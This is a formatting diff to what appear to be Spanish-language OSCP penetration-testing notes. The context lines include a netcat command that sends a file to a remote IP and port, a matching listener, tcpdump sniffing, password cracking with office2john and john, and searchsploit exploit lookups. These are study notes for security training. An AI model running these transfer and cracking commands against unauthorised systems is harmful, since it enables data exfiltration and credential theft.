@@ -92,15 +92,14 @@ nc 10.10.14.2 4242 < file.tgz
 
 nc -lvnp 4242 > file.tgz
 
-#### 
+ 
 
-Sniffing[](https://hack.xero-sec.com/apuntes-y-recursos-oscp/tecnicas-fundamentales#sniffing)
+### Sniffing[](https://hack.xero-sec.com/apuntes-y-recursos-oscp/tecnicas-fundamentales#sniffing)
 
 tcpdump -i tun0 icmp -n
+ 
 
-#### 
-
-Cracking[](https://hack.xero-sec.com/apuntes-y-recursos-oscp/tecnicas-fundamentales#cracking)
+### Cracking[](https://hack.xero-sec.com/apuntes-y-recursos-oscp/tecnicas-fundamentales#cracking)
 
 #Básico
 
@@ -124,12 +123,12 @@ office2john.py <Ruta_Documento> > <Archivo_hash>
 
 john --wordlist=<Ruta_Diccionario> <Archivo_hash>
 
-#### 
 
-Búsqueda de exploits[](https://hack.xero-sec.com/apuntes-y-recursos-oscp/tecnicas-fundamentales#busqueda-de-exploits)
-
+### Búsqueda de exploits[](https://hack.xero-sec.com/apuntes-y-recursos-oscp/tecnicas-fundamentales#busqueda-de-exploits)
+```
 searchsploit <SOFTWARE>
 
 searchsploit -x <ID_EXPLOIT> # Inspeccionar el código del exploit
 
 searchsploit -m <ID_EXPLOIT> # Mueve el exploit al directorio actual de trabajo
+```
